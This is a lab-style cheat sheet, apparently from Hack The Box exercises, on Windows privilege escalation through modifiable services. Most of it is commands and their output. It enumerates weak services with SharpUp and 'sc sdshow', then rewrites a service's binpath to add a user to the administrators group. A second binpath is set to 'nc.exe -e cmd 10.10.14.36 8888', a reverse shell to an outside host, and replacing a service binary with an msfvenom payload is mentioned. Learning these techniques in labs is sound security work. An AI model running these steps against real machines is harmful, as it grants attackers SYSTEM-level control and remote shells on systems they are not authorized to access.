Using `SharpUp`, it is possible to determine which services the current user can modify.

```bash
c:\Tools>SharpUp.exe

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Services ===

  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"


=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```
#### Modifiable Services

Look at the individual services and see which user the service is using when in use:

```bash
c:\Tools>sc qc WindscribeService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: WindscribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : WindscribeService
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Modify the service:

```bash
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```

Stop and start the service:
```bash
sc stop WindscribeService
sc start WindscribeService
```
### Modifiable Service Binaries

Use `msfvenom`, replace the `exe` using the same name as the original service. Start and Stop the service.

### Another example:

```bash
*Evil-WinRM* PS C:\windows\tasks> services

Path                                                                                        Privileges Service          
----                                                                                        ---------- -------          
"C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe"                                   False FileZilla Server 
C:\Windows\tasks\nc.exe -e cmd 10.10.14.36 8888                                                   True IObitUnSvr       
\??\C:\Program Files (x86)\IObit\IObit Uninstaller\drivers\win10_amd64\IUFileFilter.sys          False IUFileFilter     
\??\C:\Program Files (x86)\IObit\IObit Uninstaller\drivers\win10_amd64\IUProcessFilter.sys       False IUProcessFilter  
\??\C:\Program Files (x86)\IObit\IObit Uninstaller\drivers\win10_amd64\IURegistryFilter.sys      False IURegistryFilter 
C:\WINDOWS\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                     True NetTcpPortSharing
C:\WINDOWS\SysWow64\perfhost.exe                                                                 False PerfHost         
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                       False Sense            
C:\WINDOWS\servicing\TrustedInstaller.exe                                                        False TrustedInstaller 
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                           False VGAuthService    
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                              False VMTools          
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2006.10-0\NisSrv.exe"                    True WdNisSvc         
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2006.10-0\MsMpEng.exe"                   True WinDefend        
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                             False WMPNetworkSvc  
```

Enumerating `IObitUnSvr`:

```bash
C:\windows\tasks>sc qc IObitUnSvr
sc qc IObitUnSvr
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: IObitUnSvr
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : 
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : IObit Uninstaller Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

```

See who controls the service:

```bash
C:\windows\tasks>sc sdshow IObitUnSvr
sc sdshow IObitUnSvr

D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPLORC;;;S-1-5-21-3529848291-2371357972-1873374923-1001)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
```

Notice the `A` and the `CCDCLCSWRPWPLORC`.
`A` - Allows
`RP`- Start Service
`WP` - Stop Service
`DC` - Change service config

The `1001` is my user:

```bash
*Evil-WinRM* PS C:\windows\tasks> whoami /user

USER INFORMATION
----------------

User Name           SID
=================== ==============================================
dante-ws02\dharding S-1-5-21-3529848291-2371357972-1873374923-1001
```

Change service config:

```bash
C:\windows\tasks>sc config IObitUnSvr binPath= "C:\Windows\tasks\nc.exe -e cmd 10.10.14.36 8888"
sc config IObitUnSvr binPath= "C:\Windows\tasks\nc.exe -e cmd 10.10.14.36 8888"
[SC] ChangeServiceConfig SUCCESS
```

Verify:

```bash
C:\windows\tasks>sc qc IObitUnSvr
sc qc IObitUnSvr
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: IObitUnSvr
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Windows\tasks\nc.exe -e cmd 10.10.14.36 8888
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : IObit Uninstaller Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

Stop Service:

```bash
sc stop IObitUnSvr
```

Start Service:

```bash
sc start IObitUnSvr
```